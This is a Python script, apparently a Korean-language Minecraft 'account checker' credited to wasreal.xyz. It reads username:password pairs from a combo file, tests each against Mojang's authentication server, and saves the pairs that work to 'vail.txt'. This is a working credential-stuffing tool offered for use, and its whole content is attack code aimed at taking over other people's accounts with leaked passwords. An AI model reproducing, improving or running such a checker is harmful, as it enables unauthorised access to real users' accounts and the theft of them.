import requests
import os
import requests
import json
import time



'''
This is made by ! ! ! wasreal.xyz ! ! !#0443
파일 2차배포, 수정배포 금지
공유 : https://wasreal.xyz
'''

def check_minecraft_account(id,pw):
    url = "https://authserver.mojang.com/authenticate"
    data = {
        "agent": {
            "name": "Minecraft",
            "version": 1
        },
        "username": id,
        "password": pw
    }
    headers = {
        "Content-Type": "application/json"
    }
    r = requests.post(url, data=json.dumps(data), headers=headers)
    return r.json()


def read_json_beautiful(json_data):
    return json.dumps(json_data, indent="\t")

def main():
    os.system("cls")
    t=input('아이디:비번 입력/ ')
    id=t.split(':')[0]
    pw=t.split(':')[1]
    try:
        q=check_minecraft_account(id,pw)
        qq=read_json_beautiful(q)
        json_data = json.loads(qq)
        
        if not os.path.isfile('vail.txt'):
            with open('vail.txt','w') as ff:
                ff.write("")
        with open('vail.txt','r') as ff:
            a=ff.read()
        

        if f"{id}:{pw}" in a:
            print(f"mail: {id} password:{pw} 는 유효합니다"+'이름: '+json_data["selectedProfile"]["name"])
            time.sleep(3)
            os.system('cls')
            main()
            return
        with open('vail.txt','a') as f:
            f.write(id+":"+pw+'\n')
        print(f"mail: {id} password:{pw} 는 유효합니다"+'이름: '+json_data["selectedProfile"]["name"])
        time.sleep(3)
        main()
    except KeyError as e:
        print('아이디 또는 비밀번호가 잘못되었습니다. 세부사항: '+str(e))
        time.sleep(3)
        os.system("cls")

        main()

def many():
    os.system("cls")
    with open('combo.txt','r') as ffff:
        b=ffff.readlines()
    
    for i in b:
        id=i.split(':')[0]
        pw=i.split(':')[1]
        try:
            q=check_minecraft_account(id,pw)
            qq=read_json_beautiful(q)
            json_data = json.loads(qq)
            with open('vail.txt','r') as f1f:
                ass=f1f.read()
            if f"{id}:{pw}" in ass:
                print(f"mail: {id} password:{pw} 는 유효합니다"+'이름: '+json_data["selectedProfile"]["name"])
                pass
            print(f"mail: {id} , password:{pw} 는 유효합니다"+'이름: '+json_data["selectedProfile"]["name"])
            with open('vail.txt','a') as f12:
                f12.write(id+":"+pw+'\n')

        except KeyError as e:
            print(f"mail: {id} , password:{pw} 는 유효하지 않습니다 세부사항: "+str(e))
            pass

        

if __name__ == '__main__':
    os.system('title ! ! ! wasreal.xyz ! ! !#0443 minecraft account checker(normal)')
    os.system('cls')
    print(f"====by wasreal.xyz====\n[1] : 다량계정 체커기\n[2] : 한계정식 체커기\n====by wasreal.xyz====\n\n")
    r=input("1 or 2 ? : ")
    if r=="1":
        many()
    if r=="2":
        main()
    


